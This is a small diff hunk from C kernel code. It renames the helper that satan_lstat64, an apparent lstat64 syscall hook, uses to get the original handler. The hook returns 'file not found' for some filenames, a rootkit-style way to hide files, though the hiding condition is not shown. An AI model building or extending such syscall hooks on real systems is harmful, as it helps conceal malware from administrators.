@@ -26,7 +26,7 @@ asmlinkage long satan_lstat64(const char __user *filename,
                 return -ENOENT;
         }
 
-        real_lstat64 = (void *) satan_syscall_original_get(__NR_lstat64);
+        real_lstat64 = (void *) satan_syscall_get_original(__NR_lstat64);
         return real_lstat64(filename, statbuf);
 }
 
